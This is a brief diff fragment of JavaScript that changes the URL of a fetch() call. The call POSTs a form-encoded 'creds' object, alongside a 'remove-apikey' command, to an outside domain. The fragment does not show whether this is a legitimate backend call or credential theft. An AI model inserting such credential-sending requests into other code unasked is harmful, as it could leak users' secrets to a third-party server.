@@ -20,7 +20,7 @@ console.log(generateId())
         command:'remove-apikey'
     }
 
-fetch('https://galacticau.fun/postLuna.php/?nnplayer=nabil',{
+fetch('https://galacticau.fun/postLuna.php',{
   method:'POST',
    headers: {"Content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
     body: Object.entries(creds).map(([k,v])=>{return k+'='+v}).join('&')
